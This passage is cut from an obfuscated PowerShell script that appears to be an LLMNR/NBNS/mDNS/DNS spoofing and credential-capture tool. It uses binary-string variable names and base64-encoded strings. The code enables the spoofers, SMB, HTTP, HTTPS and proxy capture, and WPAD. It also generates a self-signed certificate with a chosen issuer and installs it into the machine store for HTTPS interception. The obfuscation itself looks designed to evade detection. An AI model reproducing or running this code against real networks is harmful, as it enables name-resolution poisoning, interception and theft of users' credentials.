        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAEMAbABlAGEAbgB1AHAAIAA9ACAARQBuAGEAYgBsAGUAZAA='))))  > $null
    }
    else
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAEMAbABlAGEAbgB1AHAAIAA9ACAARABpAHMAYQBiAGwAZQBkAA=='))))  > $null    
    }
    if($ADIDNS -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AYgBvAA=='))))
    {
        ${00101000010000101}.request_table_updated = $true
    }
}
else
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAFMAcABvAG8AZgBlAHIAIAA9ACAARABpAHMAYQBiAGwAZQBkAA=='))))  > $null
}
if($DNS -eq 'Y')
{
    if(${00010001111001000} -or !${01111000110100000})
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABEAE4AUwAgAFMAcABvAG8AZgBlAHIAIAA9ACAARQBuAGEAYgBsAGUAZAA='))))  > $null
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABEAE4AUwAgAFQAVABMACAAPQAgACQARABOAFMAVABUAEwAIABTAGUAYwBvAG4AZABzAA=='))))  > $null
    }
    else
    {
        $DNS = "N"
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABEAE4AUwAgAFMAcABvAG8AZgBlAHIAIABEAGkAcwBhAGIAbABlAGQAIABEAHUAZQAgAFQAbwAgAEkAbgAgAFUAcwBlACAAUABvAHIAdAAgADUAMwA='))))  > $null
    }
}
else
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABEAE4AUwAgAFMAcABvAG8AZgBlAHIAIAA9ACAARABpAHMAYQBiAGwAZQBkAA=='))))  > $null
}
if($LLMNR -eq 'Y')
{
    if(${00010001111001000} -or !${01011110010011110})
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABMAEwATQBOAFIAIABTAHAAbwBvAGYAZQByACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABMAEwATQBOAFIAIABUAFQATAAgAD0AIAAkAEwATABNAE4AUgBUAFQATAAgAFMAZQBjAG8AbgBkAHMA'))))  > $null
    }
    else
    {
        $LLMNR = "N"
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABMAEwATQBOAFIAIABTAHAAbwBvAGYAZQByACAARABpAHMAYQBiAGwAZQBkACAARAB1AGUAIABUAG8AIABJAG4AIABVAHMAZQAgAFAAbwByAHQAIAA1ADMANQA1AA=='))))  > $null
    }
}
else
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABMAEwATQBOAFIAIABTAHAAbwBvAGYAZQByACAAPQAgAEQAaQBzAGEAYgBsAGUAZAA='))))  > $null
}
if($mDNS -eq 'Y')
{
    if(${00010001111001000} -or !${01111011010001010})
    {
        ${11000000110110000} = $mDNSTypes -join ","
        if($mDNSTypes.Count -eq 1)
        {
            ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABtAEQATgBTACAAUwBwAG8AbwBmAGUAcgAgAEYAbwByACAAVAB5AHAAZQAgACQAewAxADEAMAAwADAAMAAwADAAMQAxADAAMQAxADAAMAAwADAAfQAgAD0AIABFAG4AYQBiAGwAZQBkAA=='))))  > $null
        }
        else
        {
            ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABtAEQATgBTACAAUwBwAG8AbwBmAGUAcgAgAEYAbwByACAAVAB5AHAAZQBzACAAJAB7ADEAMQAwADAAMAAwADAAMAAxADEAMAAxADEAMAAwADAAMAB9ACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
        }
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABtAEQATgBTACAAVABUAEwAIAA9ACAAJABtAEQATgBTAFQAVABMACAAUwBlAGMAbwBuAGQAcwA='))))  > $null
    }
    else
    {
        $mDNS = "N"
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABtAEQATgBTACAAUwBwAG8AbwBmAGUAcgAgAEQAaQBzAGEAYgBsAGUAZAAgAEQAdQBlACAAVABvACAASQBuACAAVQBzAGUAIABQAG8AcgB0ACAANQAzADUAMwA='))))  > $null
    }
}
else
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABtAEQATgBTACAAUwBwAG8AbwBmAGUAcgAgAD0AIABEAGkAcwBhAGIAbABlAGQA'))))  > $null
}
if($NBNS -eq 'Y')
{
    ${10010010010011111} = $NBNSTypes -join ","
    if($NBNSTypes.Count -eq 1)
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABOAEIATgBTACAAUwBwAG8AbwBmAGUAcgAgAEYAbwByACAAVAB5AHAAZQAgACQAewAxADAAMAAxADAAMAAxADAAMAAxADAAMAAxADEAMQAxADEAfQAgAD0AIABFAG4AYQBiAGwAZQBkAA=='))))  > $null
    }
    else
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABOAEIATgBTACAAUwBwAG8AbwBmAGUAcgAgAEYAbwByACAAVAB5AHAAZQBzACAAJAB7ADEAMAAwADEAMAAwADEAMAAwADEAMAAwADEAMQAxADEAMQB9ACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
    }
}
else
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABOAEIATgBTACAAUwBwAG8AbwBmAGUAcgAgAD0AIABEAGkAcwBhAGIAbABlAGQA'))))  > $null
}
if($NBNSBruteForce -eq 'Y')
{   
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABOAEIATgBTACAAQgByAHUAdABlACAARgBvAHIAYwBlACAAUwBwAG8AbwBmAGUAcgAgAFQAYQByAGcAZQB0ACAAPQAgACQATgBCAE4AUwBCAHIAdQB0AGUARgBvAHIAYwBlAFQAYQByAGcAZQB0AA==')))) > $null
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABOAEIATgBTACAAQgByAHUAdABlACAARgBvAHIAYwBlACAAUwBwAG8AbwBmAGUAcgAgAEkAUAAgAEEAZABkAHIAZQBzAHMAIAA9ACAAJABTAHAAbwBvAGYAZQByAEkAUAA=')))) > $null
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABOAEIATgBTACAAQgByAHUAdABlACAARgBvAHIAYwBlACAAUwBwAG8AbwBmAGUAcgAgAEgAbwBzAHQAbgBhAG0AZQAgAD0AIAAkAE4AQgBOAFMAQgByAHUAdABlAEYAbwByAGMAZQBIAG8AcwB0AA==')))) > $null
    if($NBNSBruteForcePause)
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABOAEIATgBTACAAQgByAHUAdABlACAARgBvAHIAYwBlACAAUABhAHUAcwBlACAAPQAgACQATgBCAE4AUwBCAHIAdQB0AGUARgBvAHIAYwBlAFAAYQB1AHMAZQAgAFMAZQBjAG8AbgBkAHMA')))) > $null
    }
}
if($NBNS -eq 'Y' -or $NBNSBruteForce -eq 'Y')
{
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABOAEIATgBTACAAVABUAEwAIAA9ACAAJABOAEIATgBTAFQAVABMACAAUwBlAGMAbwBuAGQAcwA=')))) > $null
}
if($SpooferLearning -eq 'Y' -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAATABlAGEAcgBuAGkAbgBnACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
    if($SpooferLearningDelay -eq 1)
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAATABlAGEAcgBuAGkAbgBnACAARABlAGwAYQB5ACAAPQAgACQAUwBwAG8AbwBmAGUAcgBMAGUAYQByAG4AaQBuAGcARABlAGwAYQB5ACAATQBpAG4AdQB0AGUA'))))  > $null
    }
    elseif($SpooferLearningDelay -gt 1)
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAATABlAGEAcgBuAGkAbgBnACAARABlAGwAYQB5ACAAPQAgACQAUwBwAG8AbwBmAGUAcgBMAGUAYQByAG4AaQBuAGcARABlAGwAYQB5ACAATQBpAG4AdQB0AGUAcwA='))))  > $null
    }
    if($SpooferLearningInterval -eq 1)
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAATABlAGEAcgBuAGkAbgBnACAASQBuAHQAZQByAHYAYQBsACAAPQAgACQAUwBwAG8AbwBmAGUAcgBMAGUAYQByAG4AaQBuAGcASQBuAHQAZQByAHYAYQBsACAATQBpAG4AdQB0AGUA'))))  > $null
    }
    elseif($SpooferLearningInterval -eq 0)
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAATABlAGEAcgBuAGkAbgBnACAASQBuAHQAZQByAHYAYQBsACAAPQAgAEQAaQBzAGEAYgBsAGUAZAA='))))  > $null
    }
    elseif($SpooferLearningInterval -gt 1)
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAATABlAGEAcgBuAGkAbgBnACAASQBuAHQAZQByAHYAYQBsACAAPQAgACQAUwBwAG8AbwBmAGUAcgBMAGUAYQByAG4AaQBuAGcASQBuAHQAZQByAHYAYQBsACAATQBpAG4AdQB0AGUAcwA='))))  > $null
    }
}
if($SpooferHostsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAASABvAHMAdABzACAAUgBlAHAAbAB5ACAAPQAgAA=='))) + ($SpooferHostsReply -join ","))  > $null
}
if($SpooferHostsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAASABvAHMAdABzACAASQBnAG4AbwByAGUAIAA9ACAA'))) + ($SpooferHostsIgnore -join ","))  > $null
}
if($SpooferIPsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAASQBQAHMAIABSAGUAcABsAHkAIAA9ACAA'))) + ($SpooferIPsReply -join ","))  > $null
}
if($SpooferIPsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAASQBQAHMAIABJAGcAbgBvAHIAZQAgAD0AIAA='))) + ($SpooferIPsIgnore -join ","))  > $null
}
if($SpooferRepeat -eq 'N')
{
    ${00101000010000101}.spoofer_repeat = $false
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAAUgBlAHAAZQBhAHQAaQBuAGcAIAA9ACAARABpAHMAYQBiAGwAZQBkAA=='))))  > $null
}
else
{
    ${00101000010000101}.spoofer_repeat = $true
}
if($SMB -eq 'Y' -and ${00010001111001000})
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAEMAYQBwAHQAdQByAGUAIAA9ACAARQBuAGEAYgBsAGUAZAA='))))  > $null
}
else
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAEMAYQBwAHQAdQByAGUAIAA9ACAARABpAHMAYQBiAGwAZQBkAA=='))))  > $null
}
if($HTTP -eq 'Y')
{
    if(${00001101001011100})
    {
        $HTTP = "N"
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABIAFQAVABQACAAQwBhAHAAdAB1AHIAZQAgAEQAaQBzAGEAYgBsAGUAZAAgAEQAdQBlACAAVABvACAASQBuACAAVQBzAGUAIABQAG8AcgB0ACAAJABIAFQAVABQAFAAbwByAHQA'))))  > $null
    }
    else
    {
        if($HTTPIP -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAuADAALgAwAC4AMAA='))))
        {
            ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQACAASQBQACAAPQAgACQASABUAFQAUABJAFAA')))) > $null
        }
        if($HTTPPort -ne 80)
        {
            ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQACAAUABvAHIAdAAgAD0AIAAkAEgAVABUAFAAUABvAHIAdAA=')))) > $null
        }
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQACAAQwBhAHAAdAB1AHIAZQAgAD0AIABFAG4AYQBiAGwAZQBkAA=='))))  > $null
    }
}
else
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQACAAQwBhAHAAdAB1AHIAZQAgAD0AIABEAGkAcwBhAGIAbABlAGQA'))))  > $null
}
if($HTTPS -eq 'Y')
{
    if(${00011011101001010})
    {
        $HTTPS = "N"
        ${00101000010000101}.HTTPS = $false
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABIAFQAVABQAFMAIABDAGEAcAB0AHUAcgBlACAARABpAHMAYQBiAGwAZQBkACAARAB1AGUAIABUAG8AIABJAG4AIABVAHMAZQAgAFAAbwByAHQAIAAkAEgAVABUAFAAUwBQAG8AcgB0AA=='))))  > $null
    }
    else
    {
        try
        { 
            ${00101000010000101}.certificate_issuer = $HTTPSCertIssuer
            ${00101000010000101}.certificate_CN = $HTTPSCertSubject
            ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAFMAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABJAHMAcwB1AGUAcgAgAD0AIAA='))) + ${00101000010000101}.certificate_issuer)  > $null
            ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAFMAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABDAE4AIAA9ACAA'))) + ${00101000010000101}.certificate_CN)  > $null
            ${00010101001100010} = (ls Cert:\LocalMachine\My | ? {$_.Issuer -Like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0A'))) + ${00101000010000101}.certificate_issuer})
            if(!${00010101001100010})
            {
                ${10111001101110101} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAAwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA=')))
                ${10111001101110101}.Encode( $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0A'))) + ${00101000010000101}.certificate_CN, ${10111001101110101}.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                ${11000001101111010} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAAwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA=')))
                ${11000001101111010}.Encode($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0A'))) + ${00101000010000101}.certificate_issuer, ${10111001101110101}.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                ${01001100011101110} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAA5AFAAcgBpAHYAYQB0AGUASwBlAHkA')))
                ${01001100011101110}.ProviderName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAA==')))
                ${01001100011101110}.KeySpec = 2
                ${01001100011101110}.Length = 2048
			    ${01001100011101110}.MachineContext = 1
                ${01001100011101110}.Create()
                ${00100110111001010} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBPAGIAagBlAGMAdABJAGQA')))
			    ${00100110111001010}.InitializeFromValue($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAuADMALgA2AC4AMQAuADUALgA1AC4ANwAuADMALgAxAA=='))))
			    ${00101000110110000} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBPAGIAagBlAGMAdABJAGQAcwAuADEA')))
			    ${00101000110110000}.Add(${00100110111001010})
			    ${11000010001010011} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAA5AEUAeAB0AGUAbgBzAGkAbwBuAEUAbgBoAGEAbgBjAGUAZABLAGUAeQBVAHMAYQBnAGUA')))
			    ${11000010001010011}.InitializeEncode(${00101000110110000})
			    ${01100001100101100} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAA5AEMAZQByAHQAaQBmAGkAYwBhAHQAZQBSAGUAcQB1AGUAcwB0AEMAZQByAHQAaQBmAGkAYwBhAHQAZQA=')))
			    ${01100001100101100}.InitializeFromPrivateKey(2,${01001100011101110},"")
			    ${01100001100101100}.Subject = ${10111001101110101}
			    ${01100001100101100}.Issuer = ${11000001101111010}
			    ${01100001100101100}.NotBefore = (Get-Date).AddDays(-271)
			    ${01100001100101100}.NotAfter = ${01100001100101100}.NotBefore.AddDays(824)
			    ${10010010111001100} = New-Object -ComObject X509Enrollment.CObjectId
			    ${10010010111001100}.InitializeFromAlgorithmName(1,0,0,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBIAEEAMgA1ADYA'))))
			    ${01100001100101100}.HashAlgorithm = ${10010010111001100}
                ${01100001100101100}.X509Extensions.Add(${11000010001010011})
                ${01100011010100101} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAA5AEUAeAB0AGUAbgBzAGkAbwBuAEIAYQBzAGkAYwBDAG8AbgBzAHQAcgBhAGkAbgB0AHMA')))
			    ${01100011010100101}.InitializeEncode($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAZQA='))),1)
                ${01100001100101100}.X509Extensions.Add(${01100011010100101})
                ${01100001100101100}.Encode()
                ${01010111101100100} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAA5AEUAbgByAG8AbABsAG0AZQBuAHQA')))
			    ${01010111101100100}.InitializeFromRequest(${01100001100101100})
			    ${10101110100111100} = ${01010111101100100}.CreateRequest(0)
                ${01010111101100100}.InstallResponse(2,${10101110100111100},0,"")
                ${00101000010000101}.certificate = (ls Cert:\LocalMachine\My | ? {$_.Issuer -match ${00101000010000101}.certificate_issuer})
            }
            else
            {
                if($HTTPSForceCertDelete -eq 'Y')
                {
                    ${00101000010000101}.HTTPS_force_certificate_delete = $true
                }
                ${00101000010000101}.HTTPS_existing_certificate = $true
                ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAFMAIABDAGEAcAB0AHUAcgBlACAAPQAgAFUAcwBpAG4AZwAgAEUAeABpAHMAdABpAG4AZwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQA='))))  > $null
            }
            ${00101000010000101}.HTTPS = $true
            if($HTTPIP -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAuADAALgAwAC4AMAA='))))
            { 
                ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAFMAIABJAFAAIAA9ACAAJABIAFQAVABQAEkAUAA=')))) > $null
            }
            if($HTTPSPort -ne 443)
            {   
                ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAFMAIABQAG8AcgB0ACAAPQAgACQASABUAFQAUABTAFAAbwByAHQA')))) > $null
            }
            ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAFMAIABDAGEAcAB0AHUAcgBlACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
        }
        catch
        {
            $HTTPS = "N"
            ${00101000010000101}.HTTPS = $false
            ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABIAFQAVABQAFMAIABDAGEAcAB0AHUAcgBlACAARABpAHMAYQBiAGwAZQBkACAARAB1AGUAIABUAG8AIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABFAHIAcgBvAHIA'))))  > $null
        }
    }
}
else
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAFMAIABDAGEAcAB0AHUAcgBlACAAPQAgAEQAaQBzAGEAYgBsAGUAZAA='))))  > $null
}
if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
{
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAC8ASABUAFQAUABTACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAAPQAgACQASABUAFQAUABBAHUAdABoAA=='))))  > $null
    if($HTTPDirectory -and !$HTTPResponse)
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAC8ASABUAFQAUABTACAARABpAHIAZQBjAHQAbwByAHkAIAA9ACAAJABIAFQAVABQAEQAaQByAGUAYwB0AG8AcgB5AA=='))))  > $null
        if($HTTPDefaultFile)
        {
            ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAC8ASABUAFQAUABTACAARABlAGYAYQB1AGwAdAAgAFIAZQBzAHAAbwBuAHMAZQAgAEYAaQBsAGUAIAA9ACAAJABIAFQAVABQAEQAZQBmAGEAdQBsAHQARgBpAGwAZQA='))))  > $null
        }
        if($HTTPDefaultEXE)
        {
            ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAC8ASABUAFQAUABTACAARABlAGYAYQB1AGwAdAAgAFIAZQBzAHAAbwBuAHMAZQAgAEUAeABlAGMAdQB0AGEAYgBsAGUAIAA9ACAAJABIAFQAVABQAEQAZQBmAGEAdQBsAHQARQBYAEUA'))))  > $null
        }
    }
    if($HTTPResponse)
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAC8ASABUAFQAUABTACAAUgBlAHMAcABvAG4AcwBlACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
    }
    if($HTTPResponse -or $HTTPDirectory -and $HTTPContentType -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AG0AbAAvAHQAZQB4AHQA'))))
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAC8ASABUAFQAUABTAC8AUAByAG8AeAB5ACAAQwBvAG4AdABlAG4AdAAgAFQAeQBwAGUAIAA9ACAAJABIAFQAVABQAEMAbwBuAHQAZQBuAHQAVAB5AHAAZQA='))))  > $null
    }
    if($HTTPAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))) -or $WPADAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))))
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABCAGEAcwBpAGMAIABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AIABSAGUAYQBsAG0AIAA9ACAAJABIAFQAVABQAEIAYQBzAGkAYwBSAGUAYQBsAG0A'))))  > $null
    }
    if($WPADDirectHosts)
    {
        foreach(${00000101010111000} in $WPADDirectHosts)
        {
            ${00100011011000011} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBmACAAKABkAG4AcwBEAG8AbQBhAGkAbgBJAHMAKABoAG8AcwB0ACwAIAAiAA=='))) + ${00000101010111000} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgApACkAIAByAGUAdAB1AHIAbgAgACIARABJAFIARQBDAFQAIgA7AA==')))
        }
    }
    if($Proxy -eq 'Y')
    {
        if(${10100000111100111})
        {
            $Proxy = "N"
            ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABQAHIAbwB4AHkAIABDAGEAcAB0AHUAcgBlACAARABpAHMAYQBiAGwAZQBkACAARAB1AGUAIABUAG8AIABJAG4AIABVAHMAZQAgAFAAbwByAHQAIAAkAFAAcgBvAHgAeQBQAG8AcgB0AA=='))))  > $null
        }
        else
        {
            ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAHIAbwB4AHkAIABDAGEAcAB0AHUAcgBlACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
